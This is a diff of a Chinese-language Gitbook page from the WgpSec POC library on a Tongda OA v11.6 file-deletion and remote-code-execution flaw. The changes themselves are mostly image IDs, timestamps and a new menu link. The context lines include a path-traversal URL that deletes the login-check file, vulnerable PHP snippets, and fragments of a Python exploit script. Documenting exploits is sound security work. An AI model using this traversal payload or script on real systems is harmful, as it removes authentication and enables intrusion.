@@ -330,6 +330,19 @@
             
         </li>
     
+        <li class="chapter " data-level="2.1.2.3" data-path="../../Web服务器漏洞/Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html">
+            
+                <a href="../../Web服务器漏洞/Weblogic/Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.html">
+            
+                    
+                    Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
+            
+                </a>
+            
+
+            
+        </li>
+    
 
             </ul>
             
@@ -2525,10 +2538,10 @@ $msg = <span class="hljs-string">&quot;&quot;</span>;
 <p>&#x5728;&#x7B2C;&#x4E00;&#x884C;&#x5305;&#x542B;&#x4E86;&#x6587;&#x4EF6; <strong>auth.inc.php</strong></p>
 <pre><code class="lang-php"><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;inc/auth.inc.php&quot;</span>;
 </code></pre>
-<p><a href="image/tongdaoa-19.png" data-lightbox="6e6f1bf5-6783-4f6a-8801-8d1e4fbc606c" data-title=""><img src="image/tongdaoa-19.png" alt=""></a></p>
+<p><a href="image/tongdaoa-19.png" data-lightbox="d1e271d4-1eb6-480c-9267-512e280f972e" data-title=""><img src="image/tongdaoa-19.png" alt=""></a></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7528;&#x4E8E;&#x68C0;&#x9A8C;&#x662F;&#x5426;&#x767B;&#x5F55;&#xFF0C;&#x672A;&#x767B;&#x5F55;&#x7684;&#x60C5;&#x51B5;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;</p>
 <p>&#x67E5;&#x770B; <strong>\webroot\module\appbuilder\assets\print.php</strong>&#x6587;&#x4EF6;</p>
-<p><a href="image/tongdaoa-20.png" data-lightbox="326a8cba-e797-45f2-8f83-55cf6b32d68d" data-title=""><img src="image/tongdaoa-20.png" alt=""></a></p>
+<p><a href="image/tongdaoa-20.png" data-lightbox="dad632ae-b82a-4b9d-9909-a87d35af232f" data-title=""><img src="image/tongdaoa-20.png" alt=""></a></p>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
 
 $s_tmp = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/../../../../logs/appbuilder/logs&quot;</span>;
@@ -2549,7 +2562,7 @@ $s_tmp .= <span class="hljs-string">&quot;/&quot;</span> . $_GET[<span class="hl
 <p>&#x53EF;&#x4EE5;&#x672C;&#x5730;&#x5728; <strong>\webroot\inc</strong> &#x76EE;&#x5F55;&#x521B;&#x5EFA; 1.txt &#x6587;&#x4EF6;</p>
 <p>&#x7136;&#x540E;&#x8BBF;&#x95EE; <strong><a href="http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt" target="_blank">http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt</a></strong> &#x5C31;&#x4F1A;&#x5220;&#x9664;&#x8FD9;&#x4E2A; 1.txt &#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4EE3;&#x8868;&#x53EF;&#x4EE5;&#x5220;&#x9664; <strong>auth.inc.php</strong> &#x767B;&#x5F55;&#x68C0;&#x9A8C;&#x6587;&#x4EF6;</p>
 <p>&#x56DE;&#x5230; upload.php &#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</p>
-<p><a href="image/tongdaoa-21.png" data-lightbox="9fd50796-ab32-4fea-b800-30dd3224a609" data-title=""><img src="image/tongdaoa-21.png" alt=""></a></p>
+<p><a href="image/tongdaoa-21.png" data-lightbox="db424eda-89f9-41df-8eb5-ca5eb3b6221d" data-title=""><img src="image/tongdaoa-21.png" alt=""></a></p>
 <p>&#x5224;&#x65AD;&#x53D8;&#x91CF; <strong>$action</strong> &#x662F;&#x5426;&#x4E3A; upload&#xFF0C;&#x518D;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x4E3A; xls &#x548C; img &#x5219;&#x8FDB;&#x5165;else&#x5206;&#x652F;</p>
 <pre><code class="lang-php"><span class="hljs-keyword">else</span> {
         $uploaddir = MYOA_ATTACH_PATH . <span class="hljs-string">&quot;/data_center/attachment/&quot;</span>;
@@ -2622,12 +2635,12 @@ $s_tmp .= <span class="hljs-string">&quot;/&quot;</span> . $_GET[<span class="hl
 <p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5229;&#x7528;file_exists&#x51FD;&#x6570;&#x7684;&#x6F0F;&#x6D1E;&#x6784;&#x9020;/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./ &#x9003;&#x9038;&#x51FA;&#x6765;</p>
 </blockquote>
 <p>&#x4F7F;&#x7528;POC&#x6765;&#x5229;&#x7528;&#x6F0F;&#x6D1E;</p>
-<p><a href="image/tongdaoa-22.png" data-lightbox="eab42344-e9b2-4c74-985b-8050dffbaba3" data-title=""><img src="image/tongdaoa-22.png" alt=""></a></p>
+<p><a href="image/tongdaoa-22.png" data-lightbox="f9972e56-c0a5-42c2-ae59-815d58a5e4d8" data-title=""><img src="image/tongdaoa-22.png" alt=""></a></p>
 <blockquote>
 <p>[!NOTE]</p>
 <p>&#x6CE8;&#x610F;&#x5728;&#x5220;&#x9664;&#x9A8C;&#x8BC1;&#x8EAB;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x4F1A;&#x9020;&#x6210;&#x540E;&#x53F0;&#x9875;&#x9762;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x56FE;&#xFF0C;&#x4F7F;&#x7528;&#x524D;&#x5907;&#x4EFD;&#x6587;&#x4EF6;</p>
 </blockquote>
-<p><a href="image/tongdaoa-23.png" data-lightbox="a669319c-6e26-4990-a6fb-591b1b1bb5b0" data-title=""><img src="image/tongdaoa-23.png" alt=""></a></p>
+<p><a href="image/tongdaoa-23.png" data-lightbox="23ba08e4-c6f9-4eab-ab71-202ebb8947ce" data-title=""><img src="image/tongdaoa-23.png" alt=""></a></p>
 <h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;poc">&#x6F0F;&#x6D1E;&#x5229;&#x7528;POC</h2>
 <pre><code class="lang-php"><span class="hljs-comment">#!/usr/bin/python3</span>
 <span class="hljs-comment">#-*- coding:utf-8 -*-</span>
@@ -2732,9 +2745,9 @@ def POC_4(target_url, cmd):
         <span class="hljs-keyword">else</span>:
             POC_4(target_url, cmd)
 </code></pre>
-<p><a href="image/tongdaoa-24.png" data-lightbox="ca990510-d018-4c0b-9f90-ef654d3e2bed" data-title=""><img src="image/tongdaoa-24.png" alt=""></a> </p>
+<p><a href="image/tongdaoa-24.png" data-lightbox="5e173f88-04b6-4b50-96e4-54f03a5e9104" data-title=""><img src="image/tongdaoa-24.png" alt=""></a> </p>
 <footer class="page-footer"><span class="copyright">WgpSec POC&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
-2021-01-21 14:32:46
+2021-01-22 07:34:27
 </span></footer>
                                 
                                 </section>
@@ -2778,7 +2791,7 @@ def POC_4(target_url, cmd):
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"通达OA v11.6 任意文件删除&RCE","level":"2.6.2.4","depth":3,"next":{"title":"通达OA v11.7后台SQL注入","level":"2.6.2.5","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.md","articles":[]},"previous":{"title":"通达OA v11.x-v11.5任意用户登录","level":"2.6.2.3","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","baidu-tongji"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"WgpSec POC文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/wgpsec/wiki"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"61e462bec0d8564bc1ffefa14359f095"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"WgpSec","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"WgpSec POC文库","language":"zh-hans","gitbook":"*","description":"由WgpSec狼组安全团队维护的公开POC库，主要由@peiqi师傅负责","theme-default":{"showLevel":true}},"file":{"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.md","mtime":"2021-01-21T14:32:46.768Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-01-21T14:33:42.313Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"通达OA v11.6 任意文件删除&RCE","level":"2.6.2.4","depth":3,"next":{"title":"通达OA v11.7后台SQL注入","level":"2.6.2.5","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.md","articles":[]},"previous":{"title":"通达OA v11.x-v11.5任意用户登录","level":"2.6.2.3","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","baidu-tongji"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"WgpSec POC文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/wgpsec/wiki"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"61e462bec0d8564bc1ffefa14359f095"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"WgpSec","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"WgpSec POC文库","language":"zh-hans","gitbook":"*","description":"由WgpSec狼组安全团队维护的公开POC库，主要由@peiqi师傅负责","theme-default":{"showLevel":true}},"file":{"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.md","mtime":"2021-01-22T07:34:27.957Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-01-22T07:35:19.877Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
